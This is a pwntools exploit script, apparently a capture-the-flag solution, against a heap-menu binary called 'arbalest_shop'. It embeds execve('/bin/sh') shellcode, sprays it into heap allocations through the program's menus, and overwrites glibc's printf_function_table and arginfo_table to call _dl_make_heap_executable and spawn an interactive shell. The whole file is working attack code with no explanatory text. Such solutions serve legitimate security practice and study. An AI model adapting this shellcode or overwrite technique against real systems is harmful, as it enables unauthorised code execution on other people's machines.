from pwn import *
import argparse
import os
from subprocess import check_output

parser = argparse.ArgumentParser()
parser.add_argument("-d", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("-r", help="Run exploit on remote service", action="store_true")
parser.add_argument("-e", help="Run binary", action="store_true")
args = parser.parse_args()

# SETTINGS #

LINK_LIBC = False
BINARY = "./arbalest_shop"
LIBC = ""
LD = ""
GDBSCRIPT = """
b *change_user_password
b *_dl_make_heap_executable
continue
"""

ip = "127.0.0.1"
port = 33063

# SETTINGS #

context.binary = BINARY
context.log_level = "INFO"
#context.terminal = ['tmux', 'splitw', '-h']

LIBC_FOLDER = os.path.dirname(LIBC)
elf = ELF(BINARY)
if LIBC != "":
    libc = ELF(LIBC)
else:
    libc = None

if LINK_LIBC:
    cmd = [LD, '--library-path', LIBC_FOLDER, BINARY]
else:
    cmd = [BINARY]

if LINK_LIBC:
    LIB_NUMBER = check_output(["ldd", BINARY]).count(b"(")
    GDBSCRIPT = """
        set stop-on-solib-events 1
    """ + "continue\n" * LIB_NUMBER + """
        set stop-on-solib-events 0
        file {}
    """.format(BINARY) + GDBSCRIPT

if args.d:
    r = gdb.debug(cmd, GDBSCRIPT)
elif args.r:
    r = remote(ip, port)
elif args.e:
    r = process(cmd)
    r.interactive()
    exit(0)
else:
    r = process(cmd)


shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# SPLOIT #
# register
r.recvuntil( b"> " )
r.send( b"2\n" )
r.recvuntil( b": " )
r.send( shellcode + b"\n" )
r.recvuntil( b": " )
r.send( shellcode + b"\n"  )
r.recvuntil( b"> " )

# login
r.send( b"1\n" )
r.recvuntil( b": " )
r.send( shellcode + b"\n"  )
r.recvuntil( b": " )
r.send( shellcode + b"\n"  )

make_heap_exec = b'4205600\n' # addr of _dl_make_heap_executable
# main menu
for i in range( 0, 67 ):
    r.recvuntil( b"> " )
    r.send( b"3\n" ) # sell arablest
    r.recvuntil( b": " )
    r.send( str( len( shellcode ) + 1024 ).encode( 'utf-8' ) + b"\n" ) # name size
    r.recvuntil( b": " )     
    r.send( shellcode + b"\n" ) # name
    r.recvuntil( b": " )
    r.send( make_heap_exec ) # price 

offset = b'4925936\n'

# add arbalest wich rewrite prtinf_function_table
r.recvuntil( b"> " )
r.send( b"3\n" ) # sell arablest
r.recvuntil( b": " )
r.send( b"4\n" ) # name size
r.recvuntil( b": " )     
r.send( b"test\n" ) # name
r.recvuntil( b": " ) 
r.send( offset ) # price
r.recvuntil( b"> " )

# change price to add another arbalest
r.send( b"4\n" ) # change price
r.recvuntil( b": " )
r.send( b"67\n" ) # index
r.recvuntil( b": " )
r.send( b"0\n" ) # new price
r.recvuntil( b"> " )

# add arbalest wich rewrite arginfo_table   
r.send( b"3\n" ) # sell arablest
r.recvuntil( b": " )
r.send( b"1024\n" ) # name size
r.recvuntil( b": " )     
r.send( b"a\n" ) # name
r.recvuntil( b": " ) 
r.send( offset ) # price
r.recvuntil( b"> " )

# return valid addr of printf_function_table 
r.send( b"4\n" ) # change price
r.recvuntil( b": " )
r.send( b"67\n" ) # index
r.recvuntil( b": " )
r.send( offset ) # new price
r.recvuntil( b"> " )

r.send( b"7\n" ) # trigger vuln, and call _dl_make_heap_executable

r.interactive()

# __parse_one_specmb+1212
